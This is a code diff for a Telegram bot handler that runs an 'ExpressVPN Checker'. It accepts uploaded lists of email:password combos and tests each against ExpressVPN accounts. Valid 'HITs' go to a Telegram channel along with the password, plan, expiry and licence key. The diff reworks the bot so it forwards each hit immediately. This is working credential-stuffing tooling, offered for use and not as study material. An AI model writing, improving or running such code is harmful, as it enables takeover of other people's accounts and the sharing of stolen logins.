@@ -1,4 +1,4 @@
-// api/telegram.js – ExpressVPN Bot (10MS style: progress every 10, hits after all)
+// api/telegram.js
 import { checkExpressVPN } from '../lib/expressChecker.js';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
 
@@ -12,23 +12,12 @@ export default async function handler(req, res) {
   const text = body.message.text;
   const document = body.message.document;
 
-  // /start
   if (text === '/start') {
-    await sendMessage(chatId,
-      "🤖 *ExpressVPN Checker Bot*\n\n" +
-      "Send a `.txt` file with combos:\n" +
-      "`email:password` (one per line)\n\n" +
-      "I'll check them one by one and send HITs to the channel after finishing."
-    );
+    await sendMessage(chatId, "🤖 ExpressVPN Checker Bot\nSend a .txt file with combos (email:password per line).\nI'll check and forward HITs to the channel.");
     return res.status(200).json({ ok: true });
   }
 
-  // File upload – accept any .txt
-  if (document && (
-      document.mime_type === 'text/plain' ||
-      document.mime_type === 'application/octet-stream' ||
-      (document.file_name && document.file_name.toLowerCase().endsWith('.txt'))
-  )) {
+  if (document && (document.mime_type === 'text/plain' || document.mime_type === 'application/octet-stream' || (document.file_name && document.file_name.toLowerCase().endsWith('.txt')))) {
     const fileUrl = await getFileUrl(document.file_id);
     if (!fileUrl) {
       await sendMessage(chatId, "❌ Failed to get file.");
@@ -54,7 +43,7 @@ export default async function handler(req, res) {
     }
 
     if (combos.length === 0) {
-      await sendMessage(chatId, "❌ No valid combos found (format: email:password)");
+      await sendMessage(chatId, "❌ No valid combos found in file (format: email:password)");
       return res.status(200).json({ ok: false });
     }
 
@@ -66,83 +55,54 @@ export default async function handler(req, res) {
   return res.status(200).json({ ok: true });
 }
 
-// ===== প্রসেসিং (প্রতি ১০টায় প্রগ্রেস, শেষে HIT একসাথে) =====
 async function processCombos(chatId, combos) {
   const total = combos.length;
-  let hits = []; // HIT গুলো এখানে জমা হবে
+  let hits = 0;
   const startTime = Date.now();
 
   await sendMessage(chatId, `📥 Received ${total} combos. Checking...`);
 
   for (let i = 0; i < combos.length; i++) {
     const combo = combos[i];
-    const result = await checkExpressVPN(combo.username, combo.password);
-
+    const result = await checkExpressVPN(combo.username, combo.password, 'admin');
     if (result.hit) {
-      hits.push(result); // শুধু জমা করো, এখনই চ্যানেলে পাঠাবে না
+      hits++;
+      await forwardToChannel(result);
     }
-
-    // প্রতি ১০টি বা শেষে প্রগ্রেস
     if ((i + 1) % 10 === 0 || i + 1 === total) {
-      await sendMessage(chatId, `⏳ Progress: ${i + 1}/${total} | Hits so far: ${hits.length}`);
+      await sendMessage(chatId, `⏳ Progress: ${i + 1}/${total} | HITs: ${hits}`);
     }
-
-    // 300ms ডিলে
     await new Promise(r => setTimeout(r, 300));
   }
 
-  // ===== সব চেক শেষ – এখন HIT গুলো চ্যানেলে পাঠাও =====
-  if (hits.length > 0) {
-    await sendMessage(chatId, `🔥 Sending ${hits.length} HIT(s) to the channel...`);
-    for (const hit of hits) {
-      await forwardToChannel(hit);
-      await new Promise(r => setTimeout(r, 300)); // স্প্যাম এড়াতে
-    }
-  }
-
   const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-  let summary = `✅ *Checking complete!*\nTotal: ${total}\n🔥 HITS: ${hits.length}\n⏱️ Time: ${elapsed}s`;
-
-  // HIT গুলোর তালিকা সারাংশে
-  if (hits.length > 0) {
-    summary += `\n\n📋 *HIT combos:*\n`;
-    hits.forEach(h => {
-      summary += `${h.email}:${h.password}\n`;
-    });
-  }
-
-  await sendMessage(chatId, summary);
+  await sendMessage(chatId, `✅ Done!\nTotal: ${total}\n🔥 HITS: ${hits}\n⏱️ ${elapsed}s`);
 }
 
-// ===== হেল্পার =====
 async function sendMessage(chatId, text) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
     await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
+      body: JSON.stringify({ chat_id: chatId, text })
     });
-  } catch (e) {}
+  } catch(e) {}
 }
 
 async function getFileUrl(fileId) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`;
-  try {
-    const res = await fetch(url);
-    const data = await res.json();
-    if (data.ok && data.result.file_path) {
-      return `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
-    }
-  } catch (e) {}
+  const res = await fetch(url);
+  const data = await res.json();
+  if (data.ok && data.result.file_path) {
+    return `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
+  }
   return null;
 }
 
 async function downloadFile(fileUrl) {
-  try {
-    const res = await fetch(fileUrl);
-    return await res.text();
-  } catch (e) { return null; }
+  const res = await fetch(fileUrl);
+  return await res.text();
 }
 
 async function forwardToChannel(result) {
@@ -152,7 +112,7 @@ async function forwardToChannel(result) {
                   `🔑 *Password:* \`${result.password}\`\n` +
                   `📋 *Plan:* ${result.plan || '—'}\n` +
                   `📅 *Expiry:* ${result.expiry || '—'}\n` +
-                  `🔑 *PC Key:* ${result.pcKey || '—'}\n` +
+                  `🗝️ *PC Key:* ${result.pcKey || '—'}\n` +
                   `📅 *Key Expiry:* ${result.keyExpire || '—'}\n` +
                   `📌 *Status:* ${result.keyStatus || '—'}\n\n` +
                   `#ExpressVPN @SHAKIB2016`;
@@ -168,5 +128,5 @@ async function forwardToChannel(result) {
         disable_web_page_preview: true
       })
     });
-  } catch (e) {}
+  } catch(e) {}
 }
